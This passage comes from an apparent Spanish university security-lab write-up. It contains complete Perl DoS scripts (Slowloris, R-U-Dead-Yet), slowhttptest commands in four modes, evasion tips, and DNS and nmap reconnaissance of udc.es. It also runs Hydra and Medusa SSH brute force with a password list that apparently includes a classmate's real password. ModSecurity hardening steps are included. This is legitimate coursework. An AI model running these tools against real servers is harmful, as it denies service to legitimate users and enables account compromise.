        if ($cache) {
            $rand = "?" . int( rand(99999999999999) );
        }
        else {
            $rand = "";
        }
        my $primarypayload =
            "GET /$rand HTTP/1.1\r\n"
          . "Host: $sendhost\r\n"
          . "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n"
          . "Content-Length: 42\r\n";
        if ( print $sock $primarypayload ) {
            print "Connection successful, now comes the waiting game...\n";
        }
        else {
            print
"That's odd - I connected but couldn't send the data to $host:$port.\n";
            print "Is something wrong?\nDying.\n";
            exit;
        }
    }
    else {
        print "Uhm... I can't connect to $host:$port.\n";
        print "Is something wrong?\nDying.\n";
        exit;
    }
    for ( my $i = 0 ; $i <= $#times ; $i++ ) {
        print "Trying a $times[$i] second delay: \n";
        sleep( $times[$i] );
        if ( print $sock "X-a: b\r\n" ) {
            print "\tWorked.\n";
            $delay = $times[$i];
        }
        else {
            if ( $SIG{_WARN_} ) {
                $delay = $times[ $i - 1 ];
                last;
            }
            print "\tFailed after $times[$i] seconds.\n";
        }
    }

    if ( print $sock "Connection: Close\r\n\r\n" ) {
        print "Okay that's enough time. Slowloris closed the socket.\n";
        print "Use $delay seconds for -timeout.\n";
        exit;
    }
    else {
        print "Remote server closed socket.\n";
        print "Use $delay seconds for -timeout.\n";
        exit;
    }
    if ( $delay < 166 ) {
        print <<EOSUCKS2BU;
Since the timeout ended up being so small ($delay seconds) and it generally 
takes between 200-500 threads for most servers and assuming any latency at 
all...  you might have trouble using Slowloris against this target.  You can 
tweak the -timeout flag down to less than 10 seconds but it still may not 
build the sockets in time.
EOSUCKS2BU
    }
}
else {
    print
"Connecting to $host:$port every $timeout seconds with $connections sockets:\n";

    if ($usemultithreading) {
        domultithreading($connections);
    }
    else {
        doconnections( $connections, $usemultithreading );
    }
}

sub doconnections {
    my ( $num, $usemultithreading ) = @_;
    my ( @first, @sock, @working );
    my $failedconnections = 0;
    $working[$_] = 0 foreach ( 1 .. $num );    #initializing
    $first[$_]   = 0 foreach ( 1 .. $num );    #initializing
    while (1) {
        $failedconnections = 0;
        print "\t\tBuilding sockets.\n";
        foreach my $z ( 1 .. $num ) {
            if ( $working[$z] == 0 ) {
                if ($ssl) {
                    if (
                        $sock[$z] = new IO::Socket::SSL(
                            PeerAddr => "$host",
                            PeerPort => "$port",
                            Timeout  => "$tcpto",
                            Proto    => "tcp",
                        )
                      )
                    {
                        $working[$z] = 1;
                    }
                    else {
                        $working[$z] = 0;
                    }
                }
                else {
                    if (
                        $sock[$z] = new IO::Socket::INET(
                            PeerAddr => "$host",
                            PeerPort => "$port",
                            Timeout  => "$tcpto",
                            Proto    => "tcp",
                        )
                      )
                    {
                        $working[$z] = 1;
                        $packetcount = $packetcount + 3;  #SYN, SYN+ACK, ACK
                    }
                    else {
                        $working[$z] = 0;
                    }
                }
                if ( $working[$z] == 1 ) {
                    if ($cache) {
                        $rand = "?" . int( rand(99999999999999) );
                    }
                    else {
                        $rand = "";
                    }
                    my $primarypayload =
                        "$method /$rand HTTP/1.1\r\n"
                      . "Host: $sendhost\r\n"
                      . "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n"
                      . "Content-Length: 42\r\n";
                    my $handle = $sock[$z];
                    if ($handle) {
                        print $handle "$primarypayload";
                        if ( $SIG{_WARN_} ) {
                            $working[$z] = 0;
                            close $handle;
                            $failed++;
                            $failedconnections++;
                        }
                        else {
                            $packetcount++;
                            $working[$z] = 1;
                        }
                    }
                    else {
                        $working[$z] = 0;
                        $failed++;
                        $failedconnections++;
                    }
                }
                else {
                    $working[$z] = 0;
                    $failed++;
                    $failedconnections++;
                }
            }
        }
        print "\t\tSending data.\n";
        foreach my $z ( 1 .. $num ) {
            if ( $working[$z] == 1 ) {
                if ( $sock[$z] ) {
                    my $handle = $sock[$z];
                    if ( print $handle "X-a: b\r\n" ) {
                        $working[$z] = 1;
                        $packetcount++;
                    }
                    else {
                        $working[$z] = 0;
                        #debugging info
                        $failed++;
                        $failedconnections++;
                    }
                }
                else {
                    $working[$z] = 0;
                    #debugging info
                    $failed++;
                    $failedconnections++;
                }
            }
        }
        print
"Current stats:\tSlowloris has now sent $packetcount packets successfully.\nThis thread now sleeping for $timeout seconds...\n\n";
        sleep($timeout);
    }
}

sub domultithreading {
    my ($num) = @_;
    my @thrs;
    my $i                    = 0;
    my $connectionsperthread = 50;
    while ( $i < $num ) {
        $thrs[$i] =
          threads->create( \&doconnections, $connectionsperthread, 1 );
        $i += $connectionsperthread;
    }
    my @threadslist = threads->list();
    while ( $#threadslist > 0 ) {
        $failed = 0;
    }
}

__END__
```

- Abre muchas conexiones HTTP

- Envía headers INCOMPLETOS muy lentamente

- Mantiene las conexiones abiertas indefinidamente

- Consume todos los hilos/hijos de Apache

```bash
chmod +x slowloris.pl
cp slowloris.pl /usr/local/bin/slowloris
```


Ataques:
```bash
perl slowloris.pl -dns 10.11.48.175 -port 80 -num 300 -timeout 3
```

Aquí mi compañero puede ver todos los ataques que ha recibido por mi:
```bash
tail /var/log/apache2/access.log
10.11.48.202 - - [04/Nov/2025:13:23:52 +0100] "GET / HTTP/1.1" 400 486 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)"
10.11.48.175 - - [04/Nov/2025:13:23:52 +0100] "HEAD / HTTP/1.1" 200 255 "-" "curl/7.88.1"
10.11.48.202 - - [04/Nov/2025:13:23:52 +0100] "GET / HTTP/1.1" 400 486 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)"
10.11.48.202 - - [04/Nov/2025:13:23:52 +0100] "GET / HTTP/1.1" 400 486 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)"
10.11.48.202 - - [04/Nov/2025:13:23:52 +0100] "GET / HTTP/1.1" 400 486 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET 
```

<br>

2-Slow http post body (R-U-Dead-Yet):

El ataque Slow HTTP POST (de la familia R-U-Dead-Yet) envía peticiones donde la cabecera HTTP anuncia un cuerpo de datos muy grande mediante Content-Length, pero luego el cuerpo se envía de forma extremadamente lenta o incompleta. Esto engaña al servidor, que mantiene la conexión abierta esperando los datos restantes que nunca llegan. Al saturar así todos los hilos de conexión disponibles del servidor con solicitudes pendientes, se consigue denegar el servicio a usuarios legítimos.

<img width="657" height="189" alt="imagen" src="https://github.com/user-attachments/assets/5d53b8ed-d5af-4db7-9583-15c6c238052a" />



Crear archivo:
```bash
nano rudy.pl
```

Copiar:
```bash
#!/usr/bin/perl
use strict;
use IO::Socket::INET;
use Getopt::Long;

print "R-U-Dead-Yet (Slow POST) Attack - Educational Use Only\n\n";

# Variables con valores por defecto
my $target = "127.0.0.1";
my $port = 80;
my $num_connections = 5;
my $timeout = 10;
my $content_length = 100000;
my $help = 0;

# Parsear argumentos de línea de comandos
my $result = GetOptions(
    "target|t=s"        => \$target,
    "port|p=i"          => \$port,
    "connections|c=i"   => \$num_connections,
    "timeout|o=i"       => \$timeout,
    "length|l=i"        => \$content_length,
    "help|h"            => \$help
);

# Mostrar ayuda si se solicita o no hay parámetros
if ($help || !$target) {
    print <<"HELP";
USO: perl $0 [OPCIONES]

OPCIONES:
    -t, --target IP         IP o dominio objetivo (requerido)
    -p, --port NUM          Puerto (default: 80)
    -c, --connections NUM   Número de conexiones (default: 5)
    -o, --timeout SEC       Segundos entre envíos (default: 10)
    -l, --length BYTES      Content-Length a anunciar (default: 100000)
    -h, --help              Mostrar esta ayuda

EJEMPLOS:
    perl $0 -t 10.11.48.175 -p 80 -c 10 -o 15
    perl $0 --target 192.168.1.100 --port 8080 --connections 5 --timeout 20
    perl $0 -t 10.11.48.175 -c 8 -o 30 -l 500000

HELP
    exit;
}

# Validar parámetros
if ($num_connections <= 0) {
    die "ERROR: El número de conexiones debe ser mayor a 0\n";
}
if ($timeout <= 0) {
    die "ERROR: El timeout debe ser mayor a 0\n";
}
if ($content_length <= 0) {
    die "ERROR: El Content-Length debe ser mayor a 0\n";
}

# Mostrar configuración
print "Configuración del ataque:\n";
print "  Target:        $target\n";
print "  Puerto:        $port\n";
print "  Conexiones:    $num_connections\n";
print "  Timeout:       $timeout segundos\n";
print "  Content-Length: $content_length bytes\n\n";

my @sockets;
my $successful_connections = 0;

print "Estableciendo $num_connections conexiones...\n";

for (my $i = 0; $i < $num_connections; $i++) {
    my $socket = IO::Socket::INET->new(
        PeerAddr => $target,
        PeerPort => $port,
        Proto    => 'tcp',
        Timeout  => 5
    );
    
    if ($socket) {
        # Enviar cabecera POST con Content-Length grande
        print $socket "POST /upload HTTP/1.1\r\n";
        print $socket "Host: $target\r\n";
        print $socket "Content-Type: application/x-www-form-urlencoded\r\n";
        print $socket "Content-Length: $content_length\r\n";
        print $socket "User-Agent: RUDY-Attack-Test\r\n";
        print $socket "\r\n";
        
        # Enviar solo una pequeña parte del cuerpo (1% del anunciado)
        my $initial_data = int($content_length * 0.01);
        $initial_data = 100 if $initial_data < 100; # Mínimo 100 bytes
        
        print $socket "A" x $initial_data;
        
        push @sockets, $socket;
        $successful_connections++;
        print "Conexión $i establecida (enviados $initial_data bytes de $content_length)\n";
    } else {
        print "ERROR: No se pudo establecer conexión $i\n";
    }
}

print "\n$successful_connections de $num_connections conexiones establecidas\n";
print "Manteniendo conexiones abiertas. Presiona Ctrl+C para detener.\n\n";

# Contadores para monitoreo
my $cycles = 0;
my $total_data_sent = $successful_connections * int($content_length * 0.01);

# Mantener conexiones abiertas enviando datos lentamente
while (1) {
    $cycles++;
    my $active_connections = 0;
    
    foreach my $socket (@sockets) {
        if ($socket) {
            # Enviar pequeños fragmentos periódicamente
            my $chunk_size = 10;
            if (print $socket "B" x $chunk_size) {
                $active_connections++;
                $total_data_sent += $chunk_size;
            } else {
                # Conexión cerrada por el servidor
                $socket = undef;
            }
        }
    }
    
    print "Ciclo $cycles - Conexiones activas: $active_connections - Datos totales: $total_data_sent bytes\n";
    
    # Eliminar conexiones cerradas
    @sockets = grep { defined $_ } @sockets;
    
    # Si no hay conexiones activas, salir
    if ($active_connections == 0) {
        print "\nTodas las conexiones fueron cerradas por el servidor.\n";
        last;
    }
    
    sleep($timeout);
}

# Cerrar conexiones restantes al salir
foreach my $socket (@sockets) {
    close $socket if $socket;
}

print "Ataque finalizado.\n";
```

```bash
chmod +x rudy.pl
cp rudy.pl /usr/local/bin/rudy
```

Probarlo:
```bash
perl rudy.pl --t 10.11.48.175 -p 80 -c 200 -o 20
```

<br>

3-Basado en rangos (Apache Killer):

Se crean numerosas peticiones superponiendo rangos de bytes en la cabecera agotando los recursos de memoria y CPU del servidor.

<img width="447" height="206" alt="imagen" src="https://github.com/user-attachments/assets/317aa710-0915-4eed-b1ac-15d3b24ef24e" />


<br>


4-Slow Read:

En este caso se envían peticiones HTTP legítimas pero se ralentiza el proceso del lectura de la respuesta retrasando el envío del ACK.

<img width="703" height="362" alt="imagen" src="https://github.com/user-attachments/assets/046637c1-6528-46dc-a75b-bcfbe7eae135" />


**¿Cómo proteger el servicio ante este tipo de ataque?**

Configurar Apache con:

    mod_reqtimeout: RequestReadTimeout header=10-20,MinRate=1000 body=10-20,MinRate=1000

    mod_evasive: Limitar conexiones por IP (DOSPageCount 2, DOSSiteCount 50)

    mod_security: Reglas contra Slowloris y requests incompletos

    mod_qos: Limitar conexiones concurrentes por IP (QS_SrvMaxConnPerIP 20)

    Ajustar MPM Prefork: Reducir MaxRequestWorkers y KeepAliveTimeout

**¿Y si se produce desde fuera de su segmento de red?**

Implementar:

    Firewall/IPS: Reglas para limitar conexiones HTTP por IP externa

    CDN/WAF: Cloudflare, AWS Shield o Akamai para filtrar tráfico malicioso

    Rate limiting en el balanceador de carga

    IP reputation y listas negras de IPs sospechosas

    CAPTCHA para tráfico sospechoso

**¿Cómo podría tratar de saltarse dicha protección?**

Técnicas de evasión:

    Rotación de IPs: Usar botnets o proxies para distribuir el ataque

    User-Agent aleatorios: Simular tráfico legítimo diverso

    Ataque más lento: Reducir velocidad para evitar detección por rate limiting

    Encripción SSL/TLS: Ocultar patrones del ataque

    Ataque desde múltiples subredes: Evadir bloqueos por segmento de red

    Combinar con tráfico legítimo: Mezclar requests maliciosos con normales

<br>

Los 4 tipos de ataques se pueden probar con **SlowHttpTest**:

    -H → SlowLoris (Slow Headers)

    -B → Slow POST (R-U-Dead-Yet)

    -R → Range Attack (Apache Killer)

    -X → Slow Read (Slow Reading)
	

- Slowhttptest (Carlos no lo recomienda, solo probamos):
```bash
sudo apt install slowhttptest -y
```

Comandos para hacer un DoS:
```bash
slowhttptest -c 1000 -H  -i 10 -r 200 -t GET -u http://10.11.48.175 -x 24 -p 3
```

Flags del  ataque:
[-c] -> significa el numero de conexiones que se le manda.
[-H] -> pone a slowhttp en modo slowloris.
[-i] -> especifica el intervalo entre los datos de seguimento para pruebas lentas.
[-r] -> especifica a velocidade de conexión.
[-u] -> especifica la url a la que se le va a hacer el ataque.
[-x] -> especifica la longitud máxima de los datos de seguimiento para pruebas slowloris .
[-p] -> especifica p intervalo de espera da respuesta HTTP en la conexión de la sonda.

Comprobar que se tiró el Apache:
```bash
curl -I http://10.11.48.175/
```

Si NO RESPONDE, verás:
curl: (7) Failed to connect to 10.11.48.175 port 80: Connection refused
o se queda colgado.


Ejemplos de los ataques:
```bash
#SlowLoris Mode:  Envía las cabeceras sin línea vacía de forma que el servidor espere eternamente
slowhttptest -c 1000 -H -g -o slowloris_stats -i 10 -r 200 -t GET -u http://10.11.48.175 -x 24 -p 3

    -H → SlowLoris: Envía cabeceras incompletas

    -c 1000 → 1000 conexiones simultáneas

    -i 10 → 10 segundos entre envíos

    -x 24 → 24 bytes por paquete (muy lento)

    -p 3 → 3 segundos de timeout de conexión

#Slow POST Mode: Reserva espacio para muchas consultas y las mantiene abiertas enviando datos lentamente
slowhttptest -c 1000 -B -g -o slowpost_stats -i 110 -r 200 -s 8192 -t POST -u http://10.11.48.175 -x 10 -p 3
    -B → Slow POST: Anuncia cuerpo grande pero envía lento

    -s 8192 → 8KB de Content-Length anunciado

    -i 110 → 110 segundos entre envíos (muy lento)

    -t POST → Usa método POST

# Apache Killer Mode - Basado en rangos
slowhttptest -c 500 -R -g -o apachekiller_stats -r 100 -t GET -u http://10.11.48.175 -x 10 -p 2

	-R → Range Attack: Envía múltiples cabeceras Range
	
	-c 500 → 500 conexiones (suficiente para consumir memoria)
	
	-r 100 → 100 conexiones/segundo (rápido para saturar)
	
	-x 10 → 10 bytes por paquete (mínimo para mantener)
	
	-p 2 → 2 segundos timeout (corto para reconexión rápida

# SlowRead Mode: # Lectura lenta de respuestas con ventana TCP pequeña
slowhttptest -c 1000 -X -g -o slowread_stats -r 200 -w 512 -y 1024 -n 5 -z 32 -u http://10.11.48.175 -p 3

    -X → SlowRead: Lee respuestas muy lentamente

    -w 512 → 512 bytes de ventana TCP (pequeña)

    -y 1024 → 1KB de lectura por vez

    -n 5 → 5 segundos entre lecturas

    -z 32 → 32 bytes por lectura (muy poco)
```

<br>
<br>

---

### **Apartado m) Instale y configure modsecurity. Vuelva a proceder con el ataque del apartado anterior. ¿Qué acontece ahora?**

> Actualizar todos los módulos de ModSecurity. Nos va mandar realizar ataques sin él primero y ver que nadie defiende. Si ahora atacamos cn ModSecurity activado la máquina si que deberia defenderse. 

> Tienes que defenderse de los 4 ataques posibles que damos!!! En la defensa no probará todos, solo alguno


1-Instalar el paquete:

```bash
apt install libapache2-mod-security2 -y
```

2. Activar el módulo:
```bash
a2enmod security2
```

3. Reiniciar Apache:
```bash
systemctl restart apache2
```

4. Verificar que está activo:
```bash
apache2ctl -M | grep security
```

Ahora debería mostrar: security2_module

5. Configurar ModSecurity:
```bash
# Copiar configuración recomendada
cp /etc/modsecurity/modsecurity.conf-recommended /etc/modsecurity/modsecurity.conf

# Editar para modo activo
nano /etc/modsecurity/modsecurity.conf
```

6. Cambiar esta línea:
```bash

# Buscar y cambiar:
SecRuleEngine DetectionOnly
# Por:
SecRuleEngine On

# Abajo del todo:
SecConnEngine On
SecConnWriteStateLimit 40
SecConnReadStateLimit 40
```
7. Reiniciar nuevamente:
```bash
systemctl restart apache2
```

Verificación final:
```bash

# Debe mostrar security2_module
apache2ctl -M | grep security

# Probar que Apache sigue funcionando
curl -I http://localhost/
```

Ahora probar los ataques del apartado anterior:
```bash

# Ejecutar Slowloris por ejemplo
perl slowloris.pl -dns 10.11.48.175 -port 80 -num 100

# En otra terminal, ver logs
tail -f /var/log/apache2/error.log
tail -f /var/log/apache2/access.log
```


**APARTADO J -> GRAFANA**

Ante de nada tenemos que poder ver los cambios de manera automática. Ponemos en el dashborad set autorefresh a 5 segundos para que se actualizen las gráficas solas cada 5 minutos.

Cambios en las gráficas y métricas.


<br>
<br>

### **Apartado n) Buscamos información.:**
**- Obtenga de forma pasiva el direccionamiento público IPv4 e IPv6 asignado a la Universidade da Coruña.**
  
**- Obtenga información sobre el direccionamiento de los servidores DNS y MX de la Universidade da Coruña.**
  
**- ¿Puede hacer una transferencia de zona sobre los servidores DNS de la UDC?. En caso negativo, obtenga todos los nombres.dominio posibles de la UDC.**

Si es factible cambiar de zona -> mostrarlo
Si no es factible mostrar también

**- ¿Qué gestor de contenidos se utiliza en www.usc.es?**

<br>
<br>

**- Obtenga de forma pasiva el direccionamiento público IPv4 e IPv6 asignado a la Universidade da Coruña.**

La obtención pasiva significa recopilar información sin interactuar directamente con los sistemas objetivo ni generar 
tráfico hacia ellos.

Varias formas:

1- Páginas web:

- **www.ip6.nl**

En esta página si introducimos el dominio de la udc nos dará lo siguiente:
<img width="947" height="606" alt="imagen" src="https://github.com/user-attachments/assets/926f4ed7-43c1-454c-ba9b-d3a05de7a353" />

Lo correspondiente a esta pregunta se encuentra en: udc.es

<br>

2-Comandos: **host**, **nslookup**, **dig**

```bash
root@ismael:~# host www.udc.es
www.udc.es has address 193.144.53.84
```

nslookup y dig a veces no viene instalado -> apt install dnsutils -y
```bash
root@ismael:~# nslookup udc.es
Server:         10.8.8.8
Address:        10.8.8.8#53

Name:   udc.es
Address: 193.144.53.84
```

```bash
root@ismael:~# dig udc.es A

; <<>> DiG 9.18.41-1~deb12u1-Debian <<>> udc.es A
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 36968
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 4, ADDITIONAL: 8

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 1232
; COOKIE: 33f55244bf6e00590100000069074a3863a54c84982d3002 (good)
;; QUESTION SECTION:
;udc.es.                                IN      A

;; ANSWER SECTION:
udc.es.                 333     IN      A       193.144.53.84

;; AUTHORITY SECTION:
udc.es.                 14400   IN      NS      chico.rediris.es.
udc.es.                 14400   IN      NS      sun.rediris.es.
udc.es.                 14400   IN      NS      zape.udc.es.
udc.es.                 14400   IN      NS      zipi.udc.es.

;; ADDITIONAL SECTION:
sun.rediris.es.         5202    IN      A       199.184.182.1
zape.udc.es.            14400   IN      A       193.144.48.100
zipi.udc.es.            14400   IN      A       193.144.48.30
chico.rediris.es.       18983   IN      A       162.219.54.2
sun.rediris.es.         6449    IN      AAAA    2620:171:808::1
zape.udc.es.            14400   IN      AAAA    2001:720:121c:e000::102
zipi.udc.es.            14400   IN      AAAA    2001:720:121c:e000::101

;; Query time: 3 msec
;; SERVER: 10.8.8.8#53(10.8.8.8) (UDP)
;; WHEN: Sun Nov 02 13:10:32 CET 2025
;; MSG SIZE  rcvd: 313
```

<br>

  
**- Obtenga información sobre el direccionamiento de los servidores DNS y MX de la Universidade da Coruña.**

En esta parte tenemos que poder ver los servidores DNS y lo servidores de correo (MX) de la udc.
Varias formas:

1-Páginas web: **www.nic.es**, **www.ip6.nl**

Podemos ver en la imagen de antes que también nos ofrecía información sobre esta pregunta, es decir, la web de ip6.nl nos daba iformación también sobre los servidores DNS de la udc también.

<br>

2-Comandos: **dig**, **nslookup -type=NS**, **dnsenum**

En dig en lo que vimos antes, podemos ver en el apartado ADDITIONAL SECTION los servidores DNS. Hay 4 servidores DNS que gestionan el dominio, 2 externos (RedIRIS) + 2 propios de UDC.

Para ver con dig los servidores de correo:
```bash
dig udc.es MX
```
Y veremos una línea tal que así:
```text
udc.es.                 3600    IN      MX      10 udc-es.mail.protection.outlook.com.
```
La UDC usa Microsoft Office 365/Exchange Online para su correo electrónico.

<br>

Con nslookup:

```bash
# Servidores DNS (NS)
nslookup -type=NS udc.es

# Servidores de Correo (MX)  
nslookup -type=MX udc.es
```

<br>

Con dnsenum. Este comando muestra ya  al vez los servidores DNS y los servidores de correo MX:

<img width="780" height="563" alt="imagen" src="https://github.com/user-attachments/assets/77a990f8-4f8d-4f4f-b220-d3831a0bd83c" />

<br>


**- ¿Puede hacer una transferencia de zona sobre los servidores DNS de la UDC?. En caso negativo, obtenga todos los nombres.dominio posibles de la UDC.**

Una transferencia de zona en servidores DNS es un proceso mediante el cual un servidor DNS obtiene una copia completa de la base de datos de zona de otro servidor DNS, lo cual no es posible debido a la configuración actual. No es posible. Los servidores DNS están configurados para bloquear esta acción por seguridad. Solo personal autorizado.

Comando para realizar la transferencia: `dig axfr @nombre_del_servidor_dns dominio.com`
```bash
root@ismael:~# dig axfr @zipi.udc.es udc.es
;; Connection to 193.144.48.30#53(193.144.48.30) for udc.es failed: timed out.
;; no servers could be reached
;; Connection to 193.144.48.30#53(193.144.48.30) for udc.es failed: timed out.
;; no servers could be reached
;; Connection to 193.144.48.30#53(193.144.48.30) for udc.es failed: timed out.
;; no servers could be reached
```

```bash
root@ismael:~# dig axfr udc.es

; <<>> DiG 9.18.41-1~deb12u1-Debian <<>> axfr udc.es
;; global options: +cmd
; Transfer failed.
```
Otra opción es usar dnsenum y dejarlo ahí un rato. Veremos como intenta hacer transferencia de zona por si solo con los dominios que hay pero no puede hacerlo con ninguno:

<img width="903" height="928" alt="imagen" src="https://github.com/user-attachments/assets/f5b21c2b-ca1a-4a20-808a-e7b5ed92c4d0" />

<br>

**Obtener todos los nombres.dominio posibles de la UDC**

```bash
nmap -sL 193.144.53.84/20 | grep udc.es
```

Usando dnsrecon:
```bash
apt install dnsrecon
dnsrecon -d udc.es                             # Enumeración DNS completa del dominio 
dnsrecon -r 193.144.48.0-193.144.63.255        # Escaneo inverso de rango IP
```

<br>

**¿Qué gestor de contenidos se utiliza en www.usc.es?**

Un sistema de gestión de contenidos (CMS) es un programa informático que permite publicar, editar y modificar contenido, así como realizar su mantenimiento desde una interfaz central. Es descubrir la "plataforma tecnológica" que usa la web sin acceder a zonas privadas. Por ejemplo: WordPress (como un blog grande), Drupal/Joomla (para plataformas más complejas), CMS propio (hecho a medida) etc.

Podemos verlo de distintas formas.

1- Páginas Web:

**https://sitereport.netcraft.com/**

Si ponemos aqui la web de la usc y vamos al apartado de Content Management System (Sistema de gestión de contenidos CMS)
 podemos ver que nos indica que usa DRUPAL.

<br>

2- Comandos: **whatweb**

Es una herramienta que hace un escaneo de aplicaciones web y enseña info sobre las tecnologías y servicios utilizados en un sitio web.

```bash
apt install whatweb
whatweb https://www.usc.es
```
Vemos una parte que indica que usa DRUPAL:
```bash
https://www.usc.gal/gl [200 OK] Apache, Content-Language[gl], Country[UNITED STATES][US], HTML5, HTTPServer[Apache], IP[52.157.220.132], MetaGenerator[Drupal 10 (https://www.drupal.org)], Script[application/json,gl&amp;theme=usc_theme&amp;include=eJxdy-EKgCAMBOAXsvZIsuYwSx20-cO3D1Ii-nV3HxyJnIkVaOSh10qhujl9RMCKuVsidVEkZvYvwB9cU_LzCmo98yDbuTBsqLw89YPU1KQMvgE1LjcS,text/plain], Strict-Transport-Security[max-age=31536000; includeSubDomains; preload], Title[Inicio | Universidade de Santiago de Compostela], UncommonHeaders[x-content-type-options,x-consumer-id,link], X-Frame-Options[SAMEORIGIN], X-XSS-Protection[1; mode=block]
```

**GRAFANA**
Habrá variaciones en las métricas de Grafana, y ocurrirán durante las consultas DNS y el uso de herramientas como dig, dnsrecon o whatweb.

- Dónde:
En los paneles de red (tráfico, peticiones DNS, uso de CPU o conexiones salientes).

- Por qué:
Porque al ejecutar esos comandos se generan peticiones hacia los servidores externos (DNS de la UDC, web de la USC, etc.), lo que aumenta momentáneamente el tráfico y las conexiones salientes, y Grafana lo registra como actividad en el sistema.
<br>
<br>

---

### **Apartado o) Trate de sacar un perfil de los principales sistemas que conviven en su red de prácticas, puertos accesibles, fingerprinting, etc.**

Vamos a usar dos tipos de nmap:

1- NMAP con la flag - A para escanear toda la red: **nmap -A IP ROUTER (10.11.48.1)/23**

El comando nmap -A 10.11.48.1/23 realiza un escaneo agresivo y completo de toda la red 10.11.48.0/23.

- -A = "Agressive" - Activa TODO:

        Detección de SO (-O)

        Detección de versiones (-sV)

        Ejecución de scripts (--script)

        Traceroute (--traceroute)

-  10.11.48.1/23 = Escanea 512 IPs (10.11.48.0 - 10.11.49.255)


Podemos probarlo de forma fácil con el router o con el compañero:
```bash
nmap -A 10.11.48.1 > nmap_router.txt
```

Salida:
```bash
Starting Nmap 7.93 ( https://nmap.org ) at 2025-11-07 20:46 CET
Nmap scan report for 10.11.48.1
Host is up (0.0045s latency).
All 1000 scanned ports on 10.11.48.1 are in ignored states.
Not shown: 994 filtered tcp ports (no-response), 6 filtered tcp ports (port-unreach)
MAC Address: DC:08:56:10:84:B9 (Alcatel-Lucent Enterprise)
Too many fingerprints match this host to give specific OS details
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   4.49 ms 10.11.48.1

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.88 seconds
```

En general muestra:

- Puertos abiertos con VERSIÓN exacta

- Sistema Operativo

- Servicios

- Traceroute: hops hasta el destino

- Scripts: Vulnerabilidades detectadas

<br>

2- NMAP con la flag -T4:

```bash
nmap -T4 10.11.48.0/23 > /home/lsi/nmap_full.txt
```
 Guardamos el resultado de todos los perfiles en un txt.
 
nmap -T4 10.11.48.0/23 está:

- Escaneando los 512 hosts de la red

- Revisando los 1000 puertos más comunes por cada host

-  A máxima velocidad (T4)

<br>

**OPCIONES de forma INDIVIDUAL**

1-Flag de detección de versiones de servicios
```bash
nmap -sV 10.11.48.1
```


2-Escaneo UDP del puerto 67 para Script NSE específico para DHCP
```bash
nmap -sU -p 67 --script=dhcp-discover 10.11.48.1
```

3-Scripts de vulnerabilidades
nmap --script vuln 10.11.48.1


4-Detección de Sistemas operativos (fingerprinting):
```bash
nmap -O 10.11.48.1
```

<br>
<br>

---

## ATAQUES Y DEFENSAS DE FUERZA BRUTA:

**Ataques de fuerza bruta:** Usar Medusa o hydra para atacar. 

**Defensas de fuerza bruta:** Usar OOSEC para defenderse. Añadir Ips baneables a hosts.deny para bloquear accesos.



### **Apartado p) Realice algún ataque de “password guessing” contra su servidor ssh y compruebe que el analizador de logs reporta las correspondientes alarmas.**

> Usar Medusa o Hydra para atacar. 

> Probar sobre un usuario mejor, no sobre la red -> Fuerza bruta bucle for sobre el usuario de lsi del compañero (no poner diccionario de usuarios, solo de contraseñas).


En mi caso voy a utilizar hydra, puesto que ya lo había usado previamente.
Tendremos que hacer los siguiente:

```bash
apt install hydra -y
```


1-Crear un fichero con los usuarios posibles:
```bash
# Crear archivo de usuarios
nano > /home/lsi/users.txt 
lsi
```

2-Crear un fichero con las contraseñas posibles (la suya es la primera del txt):
```bash
nano /home/lsi/passwords.txt 
20022025
password
123456
12345678
1234
12345
qwerty
admin
password123
secret
lsi
lsi123
lsi2025
lsi2002
LsI2025
lsi@2025
02022025
200225
022025
20252002
25022002
linux
ubuntu
debian
ssh
root
toor
2002
2025
20022024
20022023
20022026
Password123
Admin123
Welcome123
ChangeMe123
123
1
a
admin123
root123
virtual
virtual;..
```


3-Ejecutar Hydra con estos dos archivos sobre la máquina de mi compañero:
```bash
hydra -L /home/lsi/users.txt -P /home/lsi/passwords.txt -t 4 -W 1 -f -V ssh://10.11.48.175
```

-L /home/lsi/users.txt     → Lee usuarios de este archivo (solo "lsi")

-P /home/lsi/passwords.txt → Lee 40 contraseñas de este archivo  

-t 4                       → Usa 4 hilos a la vez (más rápido)

-W 1                       → Espera 1 segundo entre intentos

-f                         → PARA cuando encuentre la contraseña correcta

-V                         → Muestra progreso en pantalla

ssh://10.11.48.175         → Ataca el servicio SSH de esta IP

En resumen, este comando comprueba para cada usuario del users.txt todas las contraseñas posibles del passwords.txt. Si algún usuario y contraseña coincide ya nos lo dice.

<img width="1898" height="271" alt="imagen" src="https://github.com/user-attachments/assets/992e1924-2c2c-4bbc-9eff-15122b6b33e3" />

Ahí lo vemos.


Con Medusa:
```bash
medusa -h 10.11.48.202 -u lsi -P passwords.txt -M ssh
```

<br>
Mientras el atacante realiza el ataque, la víctima debe revisar sus logs:

```bash
# En la máquina víctima, ver intentos
tail -f /var/log/rsyslog_server/lucas/auth.log       # lucas
